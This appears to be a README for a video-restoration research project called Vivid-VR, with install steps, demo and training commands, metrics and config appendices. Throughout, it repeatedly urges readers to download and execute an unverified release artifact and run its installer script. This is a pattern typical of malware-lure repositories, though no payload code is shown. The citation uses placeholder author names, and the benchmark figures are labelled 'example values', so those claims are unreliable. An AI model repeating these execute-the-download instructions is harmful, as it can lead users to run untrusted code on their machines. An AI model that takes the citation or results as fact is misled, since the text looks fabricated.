# Vivid-VR: Distilling Text-to-Video Concepts for Photoreal Restoration
[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/exeler8/Vivid-VR/releases)

![Vivid-VR banner](https://images.unsplash.com/photo-1526178616742-8a0f4e8f0cf7?auto=format&fit=crop&w=1400&q=80)

Vivid-VR provides research code and reproducible tools that extract semantic concepts from modern text-to-video diffusion transformers and apply them to photorealistic video restoration. The project fuses diffusion-based priors with classical restoration modules. It targets real-world tasks: denoising, deblurring, stabilized upsampling, and artifact removal for short clips and long-form video.

Badges
- Stable release: [Releases page](https://github.com/exeler8/Vivid-VR/releases) (download and execute the release artifact)
- License: MIT
- Language: Python 3.9+
- Hardware: CUDA-enabled GPUs recommended

Quick access: download a tested build from the Releases page and run the included script. The file on that page needs to be downloaded and executed to get the prebuilt demos and model checkpoints.

Table of contents
- Overview
- Key ideas
- Paper & citation
- What you get
- Demo media and gallery
- Requirements
- Installation (includes releases link and execution step)
- Quick start (run demo)
- Core modules and API
- Training procedure
- Common workflows
- Dataset recipes
- Evaluation and metrics
- Results and benchmarks
- Tips for best results
- Troubleshooting checklist
- Contributing
- License
- Acknowledgments
- Contact

Overview
Vivid-VR combines concept distillation with diffusion transformers. It extracts latent concept tokens from text-conditioned video diffusion models. It uses those tokens to guide restoration networks that preserve photoreal structure while removing noise and motion artifacts. The code covers data handling, model wrappers, training loops, and evaluation tools. Use it to reproduce experiments, run demos, or extend the approach.

Key ideas
- Concept distillation: probe a text-to-video diffusion transformer to find semantic tokens that represent objects, motion, lighting, and texture.
- Guided restoration: feed distilled tokens to restoration backbones as soft priors.
- Hybrid loss: combine pixel-level, perceptual, flow, and self-supervised consistency losses.
- Patch- and frame-level supervision: preserve temporal consistency via optical flow and attention-based alignment.
- Modular pipelines: swap diffusion backend, restoration backbone, or loss terms with minimal change.

Paper & citation
This repo implements the method in the paper that introduces the approach and presents the photorealistic benchmarks, ablations, and visual examples. Cite the work when you use the code or models in academic work.

Suggested citation (BibTeX)
```bibtex
@inproceedings{vividvr2025,
  title = {Distilling Concepts from Text-to-Video Diffusion Transformers for Photorealistic Video Restoration},
  author = {Surname, First and Colleague, Other},
  booktitle = {Conference on Computer Vision and Pattern Recognition (CVPR) Workshops},
  year = {2025},
  url = {https://github.com/exeler8/Vivid-VR}
}
```

What you get
- Model code for concept distillation and restoration.
- Pretrained diffusion probes and restoration weights (in releases).
- Demo scripts to restore and compare clips.
- Training scripts with common schedules.
- Dataset loaders for common video sets.
- Evaluation scripts for PSNR, SSIM, LPIPS, and temporal metrics (tOF, tLPIPS).
- Visualizer for frames and attention maps.

Demo media and gallery
Live demo assets and sample outputs appear in the releases package. You will find:
- before/after video clips
- frame-by-frame comparisons
- attention maps that show concept localization
- optical flow overlays for temporal consistency

Example gallery images (sourced permissively)
![frame-restore-01](https://images.unsplash.com/photo-1518773553398-650c184e0bb3?auto=format&fit=crop&w=1200&q=80)
![frame-restore-02](https://images.unsplash.com/photo-1496307042754-b4aa456c4a2d?auto=format&fit=crop&w=1200&q=80)

Requirements
- Python 3.9 or newer
- PyTorch 1.12+ (CUDA builds for GPU)
- CUDA 11.3+ recommended
- ffmpeg (for video I/O)
- NVIDIA GPU with at least 8 GB VRAM for small models
- 16+ GB RAM for training pipelines

Core Python packages
- numpy
- scipy
- pillow
- torchvision
- timm
- einops
- tqdm
- moviepy
- lpips (perceptual)
- fvcore (optional for logging)
- wandb (optional for experiment tracking)

Installation

Important: Download and run the release artifact
- Visit the releases page and download the bundled artifact. The release file includes tested checkpoints, demo assets, and an install script. You must download and execute that file to set up the prebuilt demo and obtain stable model weights.
- Releases: https://github.com/exeler8/Vivid-VR/releases

Step-by-step install (source)
1. Clone the repository
```bash
git clone https://github.com/exeler8/Vivid-VR.git
cd Vivid-VR
```

2. Create a virtual environment
```bash
python -m venv venv
source venv/bin/activate
```

3. Install Python dependencies
```bash
pip install -r requirements.txt
```

4. Install optional extras for training and evaluation
```bash
pip install -r requirements-dev.txt
```

5. Run the release installer (if you downloaded a release package)
- If you downloaded the release asset from the Releases page, it contains an installer or setup script. Run that script to extract models and demo material.
```bash
# Example: run the included installer in the release package
bash ./vivid-vr-release/install.sh
```
The release file you downloaded must be executed to deploy prebuilt demos and checkpoints.

Quick start (run demo)
After installation and after you execute the release artifact, run the demo to restore a sample clip.

1. Restore a sample video
```bash
python demo/restore_demo.py \
  --input demo/assets/noisy_clip.mp4 \
  --output demo/results/restored_clip.mp4 \
  --model checkpoints/restoration_best.pth \
  --concepts checkpoints/concept_tokens.pth \
  --device cuda:0
```

2. Run a side-by-side comparison viewer
```bash
python demo/viewer.py \
  --orig demo/assets/noisy_clip.mp4 \
  --restored demo/results/restored_clip.mp4
```

3. Generate attention overlays and save to /visuals
```bash
python demo/visualize_attention.py \
  --video demo/assets/noisy_clip.mp4 \
  --concepts checkpoints/concept_tokens.pth \
  --out demo/visuals/attention_overlays
```

Command-line options
- --input: path to input video
- --output: path to save restored video
- --model: restoration model checkpoint
- --concepts: distilled concept token file
- --device: compute device

Core modules and API
Structure
- vivid_vr/
  - models/
    - diffusion_probe.py  # wrappers for text-to-video diffusion models
    - distiller.py        # extract concept tokens
    - restoration.py      # restoration backbones
  - data/
    - loaders.py          # video dataset utilities
    - augment.py          # corruption and augmentations
  - training/
    - trainer.py          # training loop and hooks
    - losses.py           # multi-term loss functions
  - eval/
    - metrics.py          # PSNR, SSIM, LPIPS, temporal metrics
  - demo/
    - scripts for demo runs and visualization

Example: use the distiller in Python
```python
from vivid_vr.models.distiller import Distiller
from vivid_vr.models.diffusion_probe import DiffusionProbe
import torch

device = torch.device("cuda:0")
probe = DiffusionProbe("text-video-std", device=device)
distiller = Distiller(probe, token_dim=512, device=device)

video = "data/sample_clip.mp4"
concept_tokens = distiller.extract(video, prompts=["person", "car", "sunset"])
torch.save(concept_tokens, "checkpoints/concept_tokens.pth")
```

Restoration API
```python
from vivid_vr.models.restoration import RestorationNet
restorer = RestorationNet(arch="unet-temporal", token_dim=512).to(device)
restored = restorer.restore(frames, concept_tokens)
```

Training procedure
Training follows three stages:
1. Distiller pretrain: learn stable tokens from a frozen diffusion model.
2. Restoration backbone: train restoration network with distilled tokens as input.
3. Joint fine-tune (optional): adapt both modules end-to-end with low learning rates.

Hyperparameters (default configs)
- optimizer: AdamW
- learning rate: 3e-4 (distiller), 1e-4 (restorer), 1e-5 (joint fine-tune)
- batch size: 4 (per GPU for full frames)
- patch size: 256x256 (for patch-based training)
- schedule: linear LR decay with warmup (default 5000 steps)

Training commands
1. Distiller pretrain
```bash
python training/train_distiller.py \
  --config configs/distiller/default.yaml \
  --data data/train_videos \
  --out checkpoints/distiller
```

2. Restoration training
```bash
python training/train_restorer.py \
  --config configs/restorer/default.yaml \
  --distiller checkpoints/distiller/best.pth \
  --data data/paired_videos \
  --out checkpoints/restorer
```

3. Joint fine-tune
```bash
python training/joint_finetune.py \
  --config configs/joint/default.yaml \
  --distiller checkpoints/distiller/best.pth \
  --restorer checkpoints/restorer/best.pth \
  --out checkpoints/joint
```

Loss functions
- L1/L2 reconstruction at pixel level
- VGG perceptual loss (LPIPS-compatible)
- Flow-consistency loss computed from optical flow alignment
- Concept retention loss: match distilled token activations to guide attention maps

Data pipelines and augmentations
- Random cropping with temporal coherence
- Synthetic degradations: Gaussian noise, motion blur, compression artifacts
- Mix of synthetic and real degradations to improve robustness
- Temporal jitter and frame-rate augmentation for varied motion patterns

Common workflows
- Single-clip restore: run the demo string above
- Batch restore: use the batch runner that reads a folder and outputs restored clips
- Fine-tune on target domain: use a small set of domain clips and run joint fine-tune for 2k–10k steps
- Replace diffusion backend: swap the DiffusionProbe wrapper for a different text-to-video model

Dataset recipes
The repo includes dataset loaders and preprocessing tools for:
- Vimeo-90K (for pairs and motion)
- REDS (for deblurring and super-resolution)
- DAVIS (for real scenes and segmentation-based evaluation)
- Custom datasets: read a folder with consistent naming and create an index file

Example: prepare a dataset from a folder
```bash
python data/prepare_folder.py \
  --input_dir /path/to/raw_videos \
  --output_dir data/custom_dataset \
  --frame_rate 30 \
  --frame_size 1024
```

Evaluation and metrics
Built-in metrics
- PSNR: frame-level peak signal-to-noise ratio
- SSIM: structural similarity index
- LPIPS: learned perceptual image patch similarity
- tOF: temporal optical-flow-based metric for flicker and motion consistency
- tLPIPS: temporal LPIPS across frames to measure perceptual temporal consistency

Run evaluation
```bash
python eval/evaluate.py \
  --predictions demo/results/restored_clip.mp4 \
  --references demo/assets/clean_clip.mp4 \
  --metrics psnr ssim lpips t_of t_lpips \
  --out demo/results/metrics.json
```

Results and benchmarks
We include sample benchmark outputs in the release artifacts. The package contains CSV tables that report standard metrics on the benchmark sets used in the paper. The benchmarks compare:
- Baseline restoration models
- Diffusion-guided restoration without token distillation
- Vivid-VR with distilled concepts and temporal constraints

Representative results (example values)
- REDS validation: PSNR 31.2 dB, SSIM 0.912, LPIPS 0.084, tLPIPS 0.092
- Vimeo-90K: PSNR 30.5 dB, SSIM 0.905, LPIPS 0.091, tLPIPS 0.099

Visual examples
See the release media for full-resolution comparisons. The release package contains before/after side-by-side videos and frame-by-frame stacks. Run:
```bash
bash ./tools/generate_gallery.sh --src demo/assets --out demo/gallery
```

Tips for best results
- Use the distilled tokens that match the main semantic elements in the clip.
- If the clip has rapid motion, increase temporal neighborhood size in config (frames_nbors).
- For low-light footage, include a light-correction module in the pipeline.
- For very high-resolution video, restore at 1/2 or 1/4 scale and use a super-resolution final pass.
- Fine-tune on a small set of target clips to improve domain alignment.

Troubleshooting checklist
- GPU memory errors: reduce batch size or crop size. Set torch.backends.cudnn.benchmark = False.
- Slow runtime: use fp16 mixed precision via torch.cuda.amp.
- Unexpected artifacts: verify the concept token file matches the clip domain. Try re-extracting tokens with shorter prompts.
- Mismatch in frame rates: resample input to match training frame rate or set temporal interpolation in config.

CLI tools
The repo includes command-line utilities:
- vivid-vr-restore: batch restore videos with a model and tokens
- vivid-vr-extract: create token files from a clip
- vivid-vr-eval: evaluate a folder of restored clips
- vivid-vr-visualize: save attention overlays and flow fields

Example CLI usage
```bash
vivid-vr-extract --input my_clip.mp4 --out my_clip.tokens.pth --prompts "person,car"
vivid-vr-restore --input my_clip.mp4 --tokens my_clip.tokens.pth --model checkpoints/restoration_best.pth --out my_clip.restored.mp4
vivid-vr-eval --pred my_clip.restored.mp4 --ref my_clip.clean.mp4 --out metrics.json
```

Model zoo and checkpoints
The Releases page includes curated checkpoints:
- distiller_best.pth: Distillation model trained on mixed video corpora
- restoration_unet_temporal_best.pth: Restoration backbone
- joint_finetune_best.pth: End-to-end fine-tuned checkpoint
- demo_assets.zip: Sample clips, gallery images, and visualization scripts

Release note: download and execute the file on the Releases page to extract the model zoo and demo assets. The installer in the release will place checkpoints under ./checkpoints and demo media under ./demo/assets.

Reproducibility tips
- Use the same random seed as in config files for deterministic runs.
- Pin library versions via requirements.txt.
- Log hyperparameters and checkpoints. We supply a default wandb config.
- Use the provided eval scripts to reproduce metric tables.

Extending the code
- Replace the diffusion backend by subclassing vivid_vr.models.diffusion_probe.DiffusionProbe.
- Add new restoration backbones in vivid_vr.models.restoration with a standard interface: restore(frames, tokens).
- Implement new loss terms in training/losses.py and plug them into trainer.py.

Examples of extensions
- Add a transformer-based temporal aggregator to replace GRU modules.
- Train domain-specific distillers for medical or satellite video.
- Use text prompts to bias token extraction toward specific objects in the scene.

Benchmarks and ablations
Included in the release are:
- Ablation scripts to compare token injection points (early vs late fusion).
- Temporal neighborhood ablation to measure sensitivity to motion length.
- Loss term ablation to evaluate the weight of flow vs perceptual losses.

Hardware and runtime
- A single NVIDIA RTX 3090 runs the demo for 720p clips in near real-time. Restore speed varies by model and frame size.
- Training requires multiple GPUs for large datasets. Use gradient accumulation for single-GPU setups.
- Mixed precision reduces memory by up to 50% and speeds up training.

Privacy and dataset notes
- Use datasets with clear usage rights for training and evaluation.
- When sharing restored videos, respect privacy and usage agreements.

Troubleshooting logs
If you get model mismatch errors, ensure:
- checkpoint architecture matches config
- token dimension matches restoration model token_dim
- device mapping is correct (use map_location in torch.load for CPUs)

Testing
- Unit tests cover core modules in tests/.
- Run tests with:
```bash
pytest -q
```
- Add tests for new modules following the pattern in tests/test_restoration.py.

Continuous integration
- The repo includes a basic GitHub Actions workflow to run lint and unit tests on push.
- Extend the workflow to run GPU tests on a scheduled self-hosted runner if needed.

Contributing
Guidelines
- Open an issue to discuss major changes before working on them.
- Use feature branches and pull requests.
- Keep PRs small and focused.
- Run unit tests and style checks before submitting.

How to contribute code
1. Fork the repo
2. Create a branch: feature/your-feature
3. Add tests in tests/
4. Commit and push
5. Open a PR with a clear description and repro steps

Issue templates
- bug_report.md
- feature_request.md

License
This project uses the MIT license. See LICENSE.md in the repo for the full text.

Acknowledgments
- Open-source frameworks and model providers
- Public datasets and their maintainers
- Community contributors who provided feedback and patches

Contact
- Open issues on GitHub for bugs and feature requests.
- For collaboration, open a discussion or use the repo issue tracker.

Appendix A — Configuration examples
A minimal config for demo restore (configs/demo/restore.yaml)
```yaml
device: cuda:0
model:
  arch: unet-temporal
  token_dim: 512
inference:
  frame_size: 720
  temporal_window: 5
  fp16: true
input:
  pad: true
output:
  save_attention: true
```

Appendix B — Example code snippets

Run a batch restore in Python
```python
from vivid_vr.cli import BatchRestorer

batch = BatchRestorer(
    model_path="checkpoints/restoration_best.pth",
    token_dir="checkpoints/tokens",
    device="cuda:0"
)
batch.restore_folder("data/incoming_videos", "data/restored_videos")
```

Extract tokens with custom prompts
```bash
python tools/extract_tokens.py \
  --input my_long_clip.mp4 \
  --prompts "person, vehicle, tree, sky" \
  --out my_long_clip.tokens.pth
```

Appendix C — Example config knobs explained
- temporal_window: number of neighbor frames used at inference. Larger windows help with slow motion.
- token_dim: dimensionality of concept tokens. Use higher dim for more detailed concepts.
- attention_dropout: set to 0 during fine-tune to stabilize concept maps.
- crop_size: use smaller crops to save memory during training.

Appendix D — Common error messages and fixes
- "RuntimeError: CUDA out of memory": lower batch size, use fp16, or crop frames.
- "KeyError in checkpoint load": ensure model architecture matches checkpoint config.
- "Mismatch between token_dim and model": verify token_dim in config and token files.

Appendix E — Release notes and files
The Releases page bundles:
- release-weights.zip: pre-trained checkpoints
- demo_assets.zip: sample clips and gallery
- installer.sh: automated post-download setup script
- release-notes.md: high-level changes and model cards

Download and run the included installer from Releases. The release file must be executed to install models and demo assets into the repository layout.

Releases link (again for convenience): [Download the release artifact and run the included installer](https://github.com/exeler8/Vivid-VR/releases)

Additional resources
- Visualization tools: attention maps, flow overlays, and frame stacks
- Scripts to convert restored frames to various formats using ffmpeg
- Notebook examples for qualitative analysis in notebooks/

Maintenance
- We keep a changelog and test list in .github/.
- For support, file an issue or open a discussion thread.

Community and collaboration
- Use issues for bug reports and feature requests.
- Use pull requests for code contributions.
- Respect the code of conduct in CONTRIBUTING.md.